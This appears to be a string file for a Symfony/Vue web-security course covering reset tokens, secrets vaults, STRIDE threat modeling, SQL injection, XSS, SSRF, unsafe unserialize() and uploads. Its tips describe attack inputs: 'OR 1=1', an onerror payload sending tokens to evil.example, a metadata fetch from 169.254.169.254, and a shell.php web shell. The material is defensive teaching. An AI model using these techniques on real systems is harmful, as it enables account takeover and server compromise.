actors.tip: Knows Sarah's email but not her password.

actors.label: App
actors.tip: Checks the reset link's token and sets the new password.

actors.label: Sarah
actors.tip: The real owner. No email ever reached her inbox, so she never noticed.

messages.tip: Knowing the email is enough; no stolen mail is needed.

messages.note: Token matches, so the password is changed
messages.tip: The app doesn't know who made the token. It only checks whether it matches.

messages.label: 200 OK, the new password now works for login

aside.title: The weakest spot is the target
aside.body: Attackers don't try to break login head-on. They look for a way in without the password: reset, an email change, "just tell support". An account is only as safe as its weakest recovery path.

items.meaning: An attacker gaining full control of someone else's account.

check.q: The attacker never got into Sarah's email inbox. How did he still complete the reset?
check.a: The token was made from the email with md5, so anyone who knows the email can build it. A token must be an unguessable, random secret value.

slides.title: A good reset token: random, hashed, expiring, single-use
slides.tldr: A reset token is random from a CSPRNG, stored only as a hash, short-lived and single-use. Without all four properties the back door is open.

blocks.title: Replacing a lost checkbook
blocks.body: When you lose your checkbook, the bank issues a new one, but carefully. Nobody should be able to guess the numbers (**random**). The bank doesn't keep the full number in its ledger, only a fingerprint, so even if the ledger is stolen no check can be forged (**hash**). A check has a validity period (**expiry**). And once a check has been cashed, it is void (**single-use**).

blocks.caption: Ryan's old token versus the right one

columns.title: md5(email)
items: Can be built by anyone who knows the email
Plain in the database, usable the moment it leaks
No expiry: works forever
Can be used many times
columns.tip: Any value that depends on known input or can be guessed falls in this category: the time, a user id, a hash of the email.

columns.title: random_bytes(32) + hash
items: 256 bits of randomness, impossible to guess
Only the SHA-256 hash in the database
Expires after 30 minutes
Marked used after a single use
columns.tip: There is no room for guessing, damage after a leak is limited, and once used it is void.

blocks.body: A reset token is random, stored hashed, expiring and single-use. Not one of the four may be missing.

items.meaning: A cryptographically secure random number generator: the operating system's source of randomness, which nobody can predict.

items: The price of storing only the hash: you can never show or re-send the same link. A second "forgot" request makes a new token, and the old ones should be voided.
Use `random_bytes(32)` or `bin2hex(random_bytes(32))` for tokens. Never `rand()`, `uniqid()`, the time or a user id.
Instead of building it yourself, you can use SymfonyCasts ResetPasswordBundle, which already follows these rules and throttles requests.

items.label: Why a fast hash is enough here and not for passwords

check.q: Why is a reset token stored hashed in the database, even though it is short-lived?
check.a: Even if the database leaks or an admin sees it, the hash doesn't reveal the real token, so nobody can use it to take over an account within its validity period.

slides.title: Sending the reset link: always the same answer
slides.tldr: The forgot endpoint gives the same answer whether or not the email exists (blocking user enumeration), rate-limits, and creates the token and sends the mail in an async handler.

blocks.body: If you say "no account with this email", a script can ask about 1,000 emails in under a minute and learn exactly who your users are. This is **user enumeration**. So the answer is always the same: "If the email exists, a link has been sent." The real work happens in the background, in a Messenger handler, so even the response time reveals nothing.

marks.tip: Two limits: per IP (say 5 requests an hour, set in rate_limiter.yaml) and per email, so one victim can't be mail-bombed from many IPs. Both count requests whether or not the email exists.
The server never looks up whether the user exists here, so even timing differences leak nothing.
Whether the email exists or not, the answer is identical: the same words, the same status.
If there is no such email, nothing happens and no error is raised. From outside, the two cases can't be told apart.
The plain token goes only into the email; it is never in the database or the queue.
The database holds only the hash and a 30-minute expiry.
The link's host comes from framework.router.default_uri, not the request's Host header; otherwise Host header poisoning could send the link to the attacker's site.

items.desc: Look at the rate limiter configuration
Start the worker so emails get sent

check.q: Why does the forgot endpoint always return the same message instead of "this email was not found"?
check.a: A different message would let an attacker try many emails and learn who the users are. An identical answer, in the same time, leaks nothing (user enumeration).

slides.title: Completing the reset: verify, change, and close every door
slides.tldr: Match the token hash and check expiry and use, change the password, mark the token used, revoke old sessions and API tokens, and notify the user.

blocks.body: The final step of a reset has several jobs, and all of them are needed. Many people stop after changing the password. But if the attacker was already logged in, his session or refresh token keeps working after the password change. So a reset means closing all the old doors too.

blocks.caption: The order for completing a reset

steps.title: 1. Match the hash
steps.body: Look up the row by the token's SHA-256
steps.tip: The database holds only the hash; hash the token the user sent and compare.

steps.title: 2. Claim the token
steps.body: One atomic UPDATE: only if unused and not expired
steps.tip: If it fails, give one generic message: the link is invalid or old. Two clicks at the same instant can't both win.

steps.title: 3. Change the password
steps.body: Store the new hash
steps.tip: If saving fails after the claim, the token is spent and the user simply asks again. That is the safe side to fail on.

steps.title: 4. Revoke everything old
steps.body: Sessions, refresh tokens, remember-me
steps.tip: When the password hash changes, Symfony logs the user out of other sessions itself; API tokens must be revoked separately.

steps.title: 5. Notify by email
steps.body: A "your password was changed" message
steps.tip: If the user didn't do it themselves, this email is the first warning sign.

marks.tip: The lookup is by hash, so the plain token is never compared in PHP. claim() also marks the token used (see below), so a second click gets null.
The user's session cookies stop working on their own, but unless you revoke refresh tokens a thief stays in through the API.
The owner learns about the change at once. If it wasn't them, this email is the first alarm.

blocks.code:
public function claim(string $hash, \DateTimeImmutable $now): ?ResetToken
{
    $claimed = $this->getEntityManager()->createQueryBuilder()
        ->update(ResetToken::class, 't')
        ->set('t.usedAt', ':now')
        ->where('t.tokenHash = :hash AND t.usedAt IS NULL AND t.expiresAt > :now')
        ->setParameter('hash', $hash)
        ->setParameter('now', $now)
        ->getQuery()->execute();    // number of rows changed

    return 1 === $claimed ? $this->findOneBy(['tokenHash' => $hash]) : null;
}

marks.tip: Check and mark happen in one UPDATE. A separate "if not used, then mark used" lets two simultaneous requests both pass the check.
Only the request that changed exactly one row wins. The loser changed zero rows and gets null.

items: Run the same validation on the new password (length, a list of leaked passwords). Don't let a weak password in through the reset path.
Send `Referrer-Policy: no-referrer` on the reset page, so the token doesn't travel to other sites in the Referer header.

check.q: Why must the attacker's old refresh token be revoked even after the reset is complete?
check.a: A refresh token isn't tied to the password; unless you revoke it, he can keep getting new access tokens even after the password change.

slides.title: More back doors in recovery, and resetting MFA
slides.tldr: Resetting by skipping MFA, security questions, passwords sent in plain email and unlimited attempts all make even strong login worthless.

blocks.body: Put MFA on the front door and an attacker walks around to the back door (recovery). So the recovery path must be at least as hard as login. In particular, decide in advance what happens when someone loses their MFA.

blocks.caption: Common recovery gaps and the right way

cells: MFA is useless once the email is taken
MFA is still required after the reset
rows.tip: When an email is hacked, MFA is the last line of defense. A reset must not break it.

cells: Support disables MFA after one phone call
Recovery codes, plus a waiting period and email notices
rows.tip: Give out one-time recovery codes in advance. If there are none, impose a 24 to 72 hour wait and warnings to every address.

cells: The answers are known or guessable
Drop them; use an email link or recovery codes instead
rows.tip: The answers can be found on social media. This isn't a second password; it is a weak password.

cells: A plain password sits in the inbox
rows.tip: Email is like a postcard: it passes through many hands. Never send a password in plain text.

cells: Brute force on the token or code
Rate-limit by both IP and email
rows.tip: A 6-digit code has only a million possibilities; with no limit it can be found within minutes.

blocks.body: If the recovery path is easier than login, all of login's security is meaningless.

items: When MFA is turned on, show 10 one-time recovery codes, store them hashed, and void each one when it is used.
When the account email or MFA changes, send a warning to the old email and ask for extra verification on sensitive actions for a while.
The price of a waiting period: the real owner who lost their phone waits 24 to 72 hours too. Say why, and issue recovery codes up front so most people never need it.

items.label: A way to think about which paths an attacker looks for

check.q: A user lost their MFA device. What is the risk if support disables MFA after only hearing "it's me" over the phone?
check.a: An attacker can use social engineering and a false identity to get MFA switched off and take the account. You need recovery codes issued beforehand, or a waiting period and warning messages.

slides.title: The safe's key is hanging on the wall
slides.tldr: Once a secret reaches git, it is leaked for good, even if the repository is private and you delete the file later.

blocks.title: The safe and its key
blocks.body: Imagine a house with an expensive safe, but the key hangs on the wall where everyone can see it. Anyone who walks in gets the key. Pushing a live key from your `.env` to git has the same effect: whoever can see the repository now owns the key.

blocks.code:
APP_ENV=prod
DATABASE_URL="mysql://root:Sh0p-2024@db.shop.example:3306/shop"
STRIPE_SECRET_KEY=sk_live_51H••••••••••••••••••••
PAYPAL_CLIENT_SECRET=7f3a9c1e8b2d4f60a5c7e1b9d3f2a8c4

marks.tip: The root user, with the password written in plain text. Whoever finds this line owns the entire database.
sk_live is a key that charges real money. A test key would have been far less scary.

blocks.body: A secret never goes into git. Once it does, assume it has leaked.

aside.title: A cloud bill in ten minutes
aside.body: A developer accidentally pushed a cloud access key to a public repository. Bots scan GitHub looking for exactly this kind of key. Within minutes someone used it to spin up expensive servers for crypto mining, and the month ended with a bill of tens of thousands of dollars.

Everyone can read the code, but only the server should be able to read the keys. If you don't keep secrets apart from code, one stolen developer laptop means the whole production system is taken over.

items.meaning: A password, API key, token or private key: anything that lets whoever knows it act as you.

check.q: The repository is private, and I deleted .env in the next commit. Is the secret safe now?
check.a: No. The old commit stays in git history, and every clone has a copy. Assume it leaked and replace the secret.

slides.title: Symfony secrets vault: the locked notebook
slides.tldr: You can keep encrypted secrets in git. The key that opens them (the private key) lives only on the production server, never with the code.

blocks.title: The safe and its separate key
blocks.body: A vault is a locked notebook: the pages lie in plain view, yet nobody can read them. Anyone can write a new line and lock it (that's the public key). But only the separate key held by the server (the private key) can open it.

blocks.caption: The encrypted secret goes into git, and the key that opens it travels a separate way

nodes.label: Developer
nodes.tip: Can encrypt a new secret with the public key only. Has no power to read the production values.

nodes.label: Git repository
nodes.tip: The files under config/secrets/prod/ are encrypted. Looking at them tells you nothing, so committing them is safe.

nodes.label: Private key
nodes.tip: The prod.decrypt.private.php file or SYMFONY_DECRYPTION_SECRET. It never goes into git.

nodes.label: Production app
nodes.tip: At startup it uses the private key to decrypt the secrets and loads them into memory.

edges.label: The developer encrypts the secret and commits it to git
On deploy, the encrypted files reach the server
The private key is placed on the server by a separate route

blocks.body: An encrypted secret and the key that opens it never live in the same place.

items.desc: creates the key pair for prod
encrypts and stores a new secret
shows the names, not the values (add --reveal for values)
decrypts the secrets on the server into a local file

items.meaning: A set of encrypted secret files that are safe to keep in git.
The private key that opens the vault. Lose it and the secrets can't be decrypted any more; if it is stolen, everything opens.

check.q: Which vault file must stay out of git, and why?
check.a: The private key (prod.decrypt.private.php). Whoever holds it can decrypt every secret stored in git.

slides.title: Using secrets: read them from env, not from code
slides.tldr: Store with secrets:set, inject with #[Autowire(env: ...)], use .env.local for development, and only ever use test keys there.

blocks.body: First put the secret in the vault, then inject it into your service's constructor with `#[Autowire(env: ...)]`. Inside the app, vault secrets look just like environment variables. The `.env` file holds only empty or fake defaults, never real values. For running on your own laptop, keep test keys such as `sk_test_...` in the git-ignored `.env.local`.

blocks.code:
# Generate the key pair once; encrypt.public.php goes into git
php bin/console secrets:generate-keys --env=prod

# Encrypt a secret (the value is asked for in the terminal)
php bin/console secrets:set STRIPE_SECRET_KEY --env=prod

# Keep the private key out of git
echo '/config/secrets/prod/prod.decrypt.private.php' >> .gitignore

marks.tip: Don't type the value on the command line, or it stays in your shell history. Let the command prompt you for it.
The private key lives in exactly this file. If it gets committed by mistake, the vault protects nothing.
The value isn't in the code; it comes from the environment. Anyone can read the code and still not get the key.
It goes in a header as a Bearer token. Never put it in the URL, because URLs get logged in many places.

items: .env is the file of defaults and is committed. Real values live in the vault, or in .env.local.
In production you can pass the private key at deploy time through the SYMFONY_DECRYPTION_SECRET environment variable, so no key file is needed.
Give every environment (dev, staging, prod) its own secrets, so a leaked staging secret leaves prod safe.

check.q: What kind of key should a developer's own laptop hold, and where?
check.a: Only test or dev keys, in the git-ignored .env.local. Live keys never go on a laptop; they exist only in the production vault.

slides.title: When a secret leaks: replace it, don't just delete it
slides.tldr: After a leak, bring the new secret online first, then revoke the old one. And give every key only as much power as it needs.

blocks.body: If you lose the key to a lock, searching for it is pointless; you change the lock. A leaked secret is the same: deleting the commit doesn't help, but **rotating** the secret (creating a new one and revoking the old one) removes the risk. If nobody has used the key yet, do it without downtime: the new secret goes live first and the old one is switched off afterwards.

blocks.caption: Rotation without downtime: new first, old last

steps.title: 1. Create the new one
steps.body: Make a new key or DB user; the old one still works
steps.tip: Both keys are valid at this point, so no request gets blocked.

steps.title: 2. Put it in the vault
steps.body: Store the new value with secrets:set
steps.tip: After a value changes, the app needs a restart or a deploy.

steps.title: 3. Deploy
steps.body: Every server restarts with the new key
steps.tip: In a rolling deploy some servers still run on the old key, so the old one has to stay valid for now.

steps.title: 4. Revoke the old one
steps.body: Once all is well, revoke the old key
steps.tip: After revocation the leaked key is useless. Without this step the rotation is unfinished.

marks.tip: A new user, so the old one keeps working until every server has switched over.
No DROP, no DELETE, no other tables: a stolen password or an injected query can read and add rows but cannot wipe the database.

blocks.title: Least privilege: keep each key's power small
items: Every service gets its own key or DB user, so one leak doesn't take everything down.
Only what is needed: an app's DB user usually gets SELECT/INSERT/UPDATE, not DROP or root.
On platforms like Stripe, create restricted keys that can only do specific things.
Give keys an expiry: with short-lived tokens, a leak does limited damage.

blocks.body: After a leak, assume everything leaked. Replace the secret; deleting it is not enough.

items: Keeping secrets in the frontend: variables starting with VITE_ in Vue end up in the browser bundle, so no secrets there.
Baking secrets into a Docker image or build log; whoever gets the image gets the key.
Using a single "master" key everywhere.

aside.body: New first, old later, and nobody gets more power than the job needs.

use: Nobody is known to have used the key yet, and downtime would hurt: new first, old last.
avoid: The key is being abused right now (unknown charges, servers you didn't start): revoke it first and accept a few minutes of downtime.

check.q: What goes wrong if you revoke the old key before installing the new one during rotation?
check.a: In between, none of the app's keys work, so you get downtime. Bring the new key online and move all servers over first, then revoke the old one.

slides.title: The feature shipped, and nobody asked "what if someone does the opposite?"
slides.tldr: Most security holes come not from coding slips but from never asking "what could an attacker do?" at design time. Threat modeling makes you ask it early.

blocks.title: Thinking like a burglar before you build
blocks.body: While drawing the plans, you decide whether the windows need grilles and what kind of lock the back door gets. Once the house is built and a burglar has been in, breaking walls is painful. Threat modeling is asking "which way would a burglar come in?" before you write the code, or even earlier, while you design the feature.

blocks.caption: The same feature: fixing it after an incident vs. thinking ahead

columns.title: Caught after launch
items: A customer changes the order id in the URL and sees someone else's order
An emergency patch, a sleepless night, compensation
Nobody knows why it happened or whether there are more
columns.tip: By the time it is caught, the data, the customers' trust and the money are already gone.

columns.title: Thought through at design time
items: "What if they send someone else's id?" comes up on design day
The object-level check becomes part of the feature
The decisions are written down, so newcomers can read them
columns.tip: A half-hour discussion is far cheaper than a week-long crisis later.

marks.tip: A voter compares the order's owner with the logged-in user. Someone else's id now gets a 403 instead of the data. This is called an object-level check.

blocks.body: Ask what an attacker could do at design time, not after the incident.

aside.body: Security mistakes hide best in features that "work fine", because we only think about what the user will do, not what an attacker will do.

items.meaning: An event that could harm the system (for example, someone taking over another person's account).
A short written analysis of what you are building, what could go wrong, and what you will do about it.

check.q: Why do we do threat modeling at design time instead of after the code is written?
check.a: Because that is when a design is cheapest to change. Fixing a flaw after launch means changing data structures, APIs and behavior, which costs far more.

slides.title: Trust boundary: where the level of trust changes
slides.tldr: A trust boundary is the line where data passes between zones of different trustworthiness. Almost every attack happens around those lines.

blocks.title: The bank counter
blocks.body: In a bank, a customer can go as far as the counter, the cashier works behind it, and only authorized staff can enter the vault. Every door between two zones is a place to stand guard. In software, those doors are trust boundaries, and at each one you check every time: who are you, what did you send, and are you allowed to do it?

blocks.caption: Data flow of a refund feature: the red and yellow arrows cross a boundary, so they get checked

nodes.label: Customer (browser)
nodes.tip: The customer's device is outside our control. Whatever it sends may be altered or forged.

nodes.label: Symfony API
nodes.tip: The zone of our own code. Everything from outside enters here and gets validated.

nodes.label: Database
nodes.tip: The innermost zone. Only validated code is allowed to write here.

nodes.label: Payment gateway
nodes.tip: An outside company. Even the webhooks it sends can't be trusted without verification.

edges.label: The customer sends a refund request (first boundary)
After validation, the API writes the order and the refund
The API tells the gateway to return the money (second boundary)
The gateway sends a webhook whose signature must be verified

blocks.body: Put a check wherever the level of trust changes.

items: Pen and paper are enough for the picture: boxes (components), arrows (which way data flows), and a line where trust changes.
Don't always trust internal services either; once one service is compromised, it becomes a path of attack into the rest.

items.meaning: All the doors an outsider could try to get in through: endpoints, file uploads, webhooks.

check.q: In the refund diagram, which arrows cross a trust boundary?
check.a: Customer to API, and API to the payment gateway (plus the gateway's webhook coming back). Those three need checks; API to database is an internal path.

slides.title: STRIDE: a checklist of six questions
slides.tldr: STRIDE names six kinds of threat: spoofing, tampering, repudiation, information disclosure, denial of service and elevation of privilege. Ask all six at every arrow.

blocks.body: To remember what can go wrong, there is a six-letter name: **STRIDE**. Stand in front of each arrow or box and ask these six questions one by one, and you will catch most serious threats. The table below gives the meaning of each letter and its usual countermeasure.

blocks.caption: STRIDE: six questions and the usual Symfony answers

cells: Is someone pretending to be someone else?
rows.tip: Stolen or faked identity: posing as a customer, or posing as the gateway to send a webhook.

cells: Can data be altered in transit or at rest?
Compute values on the server, HMAC, HTTPS
rows.tip: Altering data. For example, a customer changes the price or amount in the request.

cells: Could someone say "I didn't do that"?
rows.tip: The chance to deny an action. Without logs you can't prove who issued a refund.

cells: Is someone seeing what they shouldn't?
rows.tip: Leaking information: seeing someone else's order, or a stack trace or secret appearing in an error.

cells: Can someone knock the service over?
rows.tip: Taking the service down: a huge file upload, or a thousand requests per second.

cells: Can a normal user do admin things?
rows.tip: Gaining power that isn't theirs: a normal user or support agent doing something beyond their limits.

aside.body: STRIDE: fake, alter, deny, leak, knock over, overreach. Six questions at every arrow.

items: Not all six questions apply to every arrow. Write down which ones don't, so nobody wonders later whether they were forgotten.
Don't just write down what comes to mind; going through the checklist surfaces the uncomfortable threats too.

check.q: A customer sends a different amount in the request. Which STRIDE letter is it, and what is the countermeasure?
check.a: T, Tampering. Don't take the amount from the client; compute it on the server from the order. The client only says which order.

slides.title: A feature's threat model in 30 minutes
slides.tldr: Four steps: draw what you are building, look for what can go wrong with STRIDE, decide what to do, and verify it was done.

blocks.caption: Four steps, half an hour, a whiteboard

steps.title: 1. Draw
steps.body: Boxes, arrows and trust boundaries
steps.tip: Drawing alone exposes a lot of vagueness, such as "who actually sends this webhook?"

steps.title: 2. Hunt
steps.body: The six STRIDE questions at every arrow
steps.tip: Start with the riskiest arrow of the feature, where money or personal data moves.

steps.title: 3. Decide
steps.body: A countermeasure or an acceptance for each threat
steps.tip: You don't have to block every threat. If you skip one, write down why.

steps.title: 4. Verify
steps.body: Tests and tickets for the countermeasures
steps.tip: If it isn't in a test, you can't count on it staying there.

blocks.title: A worked example: the refund API
items: S: what if someone asks for a refund with a stolen token? Ask for the password or an OTP again on risky actions.
T/I: can the customer supply the amount or someone else's order id? Compute the amount on the server and check ownership of the order.
R/E: how much can a support agent refund, and where is it recorded who did it?
D: what if someone requests refunds in a loop to flood the gateway or the database? Add a rate limit per user, and refuse a second refund of the same order.

marks.tip: The voter looks at the order and decides whether this user may refund it. One line blocks both E and I.
Autowired by name: $refundLimiter is the limiter called refund in config/packages/rate_limiter.yaml (below).
The request body has no amount at all, so there is nothing to tamper with.
With an audit log, nobody can claim "I didn't do it".

blocks.code:
framework:
    rate_limiter:
        refund:
            policy: 'sliding_window'
            limit: 3
            interval: '1 hour'

items: Writing a threat model once and filing it away. Look at it again when the feature changes.
Treating all threats as equal. Look at the size of the damage and the likelihood, and handle the big ones first.
Leaving it to the security expert alone. Keep the person building the feature in the room; they know the inside story.

use: New features involving money, personal data or permissions, and new outside integrations.
avoid: A small UI change doesn't need a whole workshop; the one-line question "what could go wrong?" is enough.

check.q: In step 3 of a threat model, must you build a countermeasure for every threat?
check.a: No. Every threat needs a decision: block it, reduce it, or accept it with a written reason. What matters most is that accepted risks are written down.

slides.title: Check at the door: everything coming in is a stranger
slides.tldr: Browser checks are only a convenience for the user. The real guard is on the server, using an allowlist, and in Symfony DTOs and constraints make that easy.

blocks.title: The ticket check at a cinema gate
blocks.body: At the cinema gate, a man waving a torn ticket still doesn't get in: the gatekeeper checks the date, the show and the seat himself. Even if a sign outside says "No entry without a ticket", he doesn't rely on the sign. The check in a Vue form is the sign; the Validator on the server is the gatekeeper.

blocks.caption: Two places to check, two different jobs

columns.title: In the browser (Vue)
items: Shows mistakes at once, a convenience for the user
Can be turned off or bypassed
Not something to rely on for security
columns.tip: Users learn about mistakes quickly, but an attacker can skip the browser and send requests straight with curl.

columns.title: On the server (Symfony)
items: Mandatory on every request
Allowlist: say what is valid, reject the rest
Check type, length, limits and format
columns.tip: The last line of defense. The client has no way around the checks made here.

blocks.body: Without a check, anyone can run `curl -X POST /orders -d '{"quantity": -5}'`. The total becomes -5 times the price, and the store now owes the customer money. With the DTO below, the same request is refused with a 422 and the message "This value should be between 1 and 10". The order code never sees it.

marks.tip: The int type plus Range stops both -5 and "abc" as quantity. A value from outside has to obey both the type and the limits.
Choice is an allowlist: only these two values pass, and anything else, even an unfamiliar new value, is rejected.
When a constraint fails, Symfony itself replies with 422 and the list of errors; the controller needs no code for it.

blocks.body: The client's check is for convenience; the server's check is for security.

aside.body: Every value entering the app is a possible attack path. If validation lives in one place (the DTO), all the code after it can assume the values have the right shape.

items: Use an allowlist ("only these pass"), not a blocklist ("reject these words"). Attackers find the path outside any blocklist.
Use #[MapQueryString] for URL query strings, keep a separate request type as the DTO, and never bind a Doctrine entity directly (mass assignment).

items.meaning: A list of what is permitted; everything outside the list is rejected.
A plain class that only holds request data and has no business logic.

check.q: The Vue form already checks everything, so why validate again on the server?
check.a: Because an attacker can skip the browser and send requests directly. Without server-side checks, any value gets in.

slides.title: SQL injection: when input becomes a command
slides.tldr: Gluing input into a SQL string turns data into instructions. With a parameterized query the value travels on a separate path, so it can never become an instruction.

blocks.title: An order in the name box
blocks.body: An office clerk reads whatever is written in the "Name" box of a form, word for word. Someone writes "Ryan. And open the cash box" in it, and the clerk takes the whole thing as an instruction. With a parameterized query, the instruction and the name travel on separate sheets of paper; so whatever is written in the name box, the clerk reads it only as a name.

marks.tip: The input is glued straight into the string. Now it is possible to close the quote and inject your own SQL.
"OR 1=1" is always true, so every user's row comes back. It gets worse: a UNION can read other tables, such as password hashes.
:email is a blank slot; the value never becomes part of the SQL, because the database driver sends it separately.
In Doctrine DBAL too, a user's value is never glued into the string.
The user's word only picks a key. Only our own column string reaches the SQL, and anything unknown falls back to p.price.

blocks.body: No input inside the SQL: the SQL is one thing, the input is a separate parameter.

items: A column name in ORDER BY, or a table name, can't be a parameter. Match the user's choice against an allowlist: ["price", "created_at"].
Using an ORM doesn't make you safe: writing createQuery("... $input ...") is the same trap.
Escaping or addslashes can't be trusted; parameters are the only correct way.
Don't give the app's DB user DROP rights or access to other databases; even if someone falls into the trap, the damage stays small.

items.label: Least privilege: the DB user's power

check.q: A user can choose sort=price or sort=name. How do you put that value into ORDER BY?
check.a: Match it against an allowlist: insert only an approved column name, and fall back to a default for anything else. ORDER BY names can't be parameters.

slides.title: XSS: someone else's code on the notice board
slides.tldr: If you put user-written HTML on a page as it is, it runs as JavaScript in other people's browsers. The remedy is to escape it or sanitize it.

blocks.title: The neighborhood notice board
blocks.body: Anyone can pin a paper on the neighborhood notice board. One person writes "Everyone please tell your bank PIN to this number", and people believe it because it is on the board. XSS is the same: an attacker's comment is placed on other users' pages and runs in their browsers, and the browser assumes the text belongs to the site.

marks.tip: Both Vue's {{ }} and Twig's {{ }} escape by default: < becomes <, so tags don't run. The author name is safe.
v-html and Twig's |raw turn escaping off. The image fails to load, onerror fires, and every visitor's token is sent to evil.example.
The same hostile body goes in; the onerror attribute comes out, so only a harmless image tag is left. Bold and links survive.
v-html now receives only the cleaned text. For plain text, drop v-html and let {{ }} escape it.

blocks.caption: Where to clean the HTML: both work, one covers more

columns.title: Clean in the browser
items: DOMPurify before v-html, as in the code above
Protects only this Vue app: a mobile app or an email still gets raw HTML
Good as a second layer, not the only one
columns.tip: Quick to add, but the raw HTML is still stored and served to every other client.

columns.title: Clean on the server
items: HtmlSanitizer at save time: one cleaning that every client benefits from
Define app.comment_sanitizer under framework.html_sanitizer
Cost: a few lines of config and one sanitize() call per save
columns.tip: The dirty HTML never reaches the database, so every client is safe at once.

blocks.body: Show user-written text either escaped or sanitized; never put it in as it is.

items: On the server, inject HtmlSanitizerInterface $appCommentSanitizer (defined in config/packages/html_sanitizer.yaml with allow_safe_elements: true) and call sanitize() before saving.
Add a Content-Security-Policy header as a second wall: if inline scripts are blocked, the damage from XSS stays limited.
A token kept in localStorage can be stolen through XSS; that is why the session cookie should be HttpOnly.

items.meaning: Turning special characters like < > & " into harmless text, so the browser doesn't take them for tags.
A header that tells the browser which sources scripts may run from.
Cutting a piece of HTML down to a safe list of tags and attributes and throwing the rest away.

check.q: A comment needs a little bold text and a link. Why is v-html dangerous, and what is the alternative?
check.a: v-html runs every tag, including <script> and onerror. Instead, sanitize (on the server with HtmlSanitizer, or with DOMPurify in the browser), keep only safe tags, and then display it.

slides.title: SSRF: making the server open an inner door
slides.tldr: If the server fetches any URL a user gives it, it can also fetch the internal network or cloud metadata. A host allowlist and blocking private IPs are the way out.

blocks.title: The courier and the manager's room
blocks.body: A courier is told, "Go to this address and bring back the parcel." An outsider supplies the address, but it is really the manager's own strongroom, which only office staff may enter. Because the courier works for the office, he walks in and brings out the parcel (the key). A server can reach the internal network too, which is why it must not follow just any URL an outsider gives it.

blocks.caption: What happens when an internal address is given as the avatar URL

nodes.label: Attacker
nodes.tip: Can't get inside on their own, so they want to use the server to get in.

nodes.label: Symfony API
nodes.tip: Sends a GET to the user-supplied URL to fetch an image. Without validation it goes to any address.

nodes.label: Cloud metadata
nodes.tip: An internal address of a cloud server that hands out the server's temporary access keys. Unreachable from outside.

edges.label: Gives http://169.254.169.254/... as the avatar URL
The server itself goes to that internal address and sends a GET
The cloud access key lands in the server's hands
The server hands that very response back to the attacker

marks.tip: NoPrivateNetworkHttpClient looks at the IP in the DNS answer and blocks private addresses, so even an "evil.com resolves to 127.0.0.1" trick gets caught.
Only https, and only hosts on the allowlist. Never send a request to a host outside the list.
Redirects off: otherwise an approved host could bounce you to an internal address of the attacker's choosing.

blocks.body: The server may follow a user-supplied URL only inside the allowlist.

items: Learn to recognize features that take a URL: image import, webhook URLs, link previews, PDF rendering. SSRF hides there.
In the cloud, keep IMDSv2 (token-based metadata) turned on; then a plain GET can't fetch keys.
The strongest wall is a network rule on the server (an egress firewall) that never lets the app reach internal addresses at all.
The price of the allowlist: users can import only from hosts you approved. If you must accept any URL, fetch it from an isolated worker with no route to your internal network.

items.meaning: Server-Side Request Forgery: tricking the server into sending requests on the attacker's behalf.
A network rule on where the server itself is allowed to connect out to.

check.q: A user supplies evil.com, whose DNS answer is 127.0.0.1. Why does checking only the hostname leave a hole?
check.a: An unlisted hostname is rejected, true, but an approved name can also point at an internal IP. So you must check the resolved IP too, which NoPrivateNetworkHttpClient does.

slides.title: unserialize(): the toy that starts when the box opens
slides.tldr: Running unserialize() on untrusted data lets an attacker build objects of any class, and those run code as they open. JSON and DTOs are the safe path.

blocks.title: The box with a living toy
blocks.body: A stranger hands you a box and says, "Open it and set the contents out exactly as they are." Inside is a toy that switches itself on the moment it is opened and starts smashing things in your house. `unserialize()` opens that box; JSON is just a written list, and opening it starts nothing.

marks.tip: An innocent method, until an attacker can choose the path. Real attacks chain such methods from the app's or a library's classes.
The cookie is in the client's hands. If they send a serialized object of their own making, PHP runs that class's __destruct or __wakeup.
The Symfony Serializer only fills the fields of the declared class. No code runs.
With allowed_classes: false, no objects can be built at all. Still, avoid it in new code.

blocks.body: Never unserialize() untrusted data. Use JSON as the format, and a specific DTO as the target.

items: The same danger applies to cache, session, queue or cookie values that a user can modify. Treat anything that has passed through the client's hands as untrusted.
JSON itself is safe, but using it afterwards to build class or method names and call them (new $data['class']) is the same trap again.
If you must send some state back to the client, sign it (HMAC) and verify the signature when it returns; still, keep anything important on the server.

check.q: A user's cart is stored serialized in a cookie. Why is that risky, and what do you do instead?
check.a: The cookie is in the client's hands, and they can send a crafted object to run code. Keep the cart on the server (session or DB), or read it through JSON and a DTO.

slides.title: File uploads: look inside the parcel, not at the label
slides.tldr: In an upload, the file name, extension and client-supplied type can't be trusted. Check the size and real type, assign a new name, and store it outside the web root.

blocks.title: Receiving parcels at the post office
blocks.body: A post office doesn't trust the label on a parcel; it weighs it and looks at what is inside. Then it stamps its own number and puts it in a warehouse customers can't enter. Uploads work the same way: the name and type sent by the client are only a label.

Without these rules, an attacker uploads `shell.php` and labels it `image/jpeg`. The old code saved it as `public/uploads/shell.php`. Opening that URL runs the attacker's PHP on your server, which is now theirs. With the code below, a file that isn't a real JPEG or PNG is refused with a 422, and even a real one gets a random name in a folder the web server never serves.

blocks.title: Five rules for uploads
items: Set a size limit; otherwise huge files fill disk and memory and knock the site over (DoS).
Allowlist the types (jpg, png, pdf), and check the real content type from inside the file.
Throw away the client's name and generate a random one; this stops path tricks like "../../x.php".
Store files outside the web root, or in separate storage (like S3), and never let code run there.
For images, re-encode them, so anything hidden inside gets dropped.

marks.tip: The Symfony Validator checks the file's real type (from the content, via finfo). It doesn't trust the type the client sent.
var/uploads is outside public/. It can't be fetched directly by URL, and the server doesn't run PHP there.
A UUID name means nothing can be guessed from the name, and old files can't be overwritten.

blocks.body: An uploaded file is something made by an unknown person: our own name, our own place, our own checks.

items: "I only look at the extension": shell.php.jpg or a doctored header slips through easily. Look at the content.
Storing in public/uploads/ with PHP execution allowed: an uploaded shell.php becomes a web shell right away.
SVG can contain script (XSS); if you must show a user's SVG, sanitize it or avoid it.

items.meaning: The folder the web server hands out to anyone on the internet by URL.
An uploaded script that gives the attacker a command line on your server, through the browser.

items: When serving the file back, set the Content-Type yourself and add the X-Content-Type-Options: nosniff header.

items.label: Where to keep files and blobs

check.q: Uploaded files are saved under the name the client sent. Which two problems can this cause?
check.a: A path trick (../) can write somewhere else or overwrite an old file, and a name like shell.php can lead to code running. So assign your own random name.

slides.title: The database dump was stolen. What was inside?
slides.tldr: A database leaves the building sooner or later (backups, bugs, theft). So store the data in a way that a thief who gets it still can't read it.

blocks.title: The store's house-account book
blocks.body: A neighborhood store's house-account book lists everyone's name, address and what they owe. If the book is stolen, the thief learns everything about everyone. But suppose real names were written only in a code the owner understood, and the code list was kept in a separate safe: the thief would have the book and still understand nothing. Data protection is exactly this idea.

blocks.caption: The same dump, two different outcomes: what the thief got

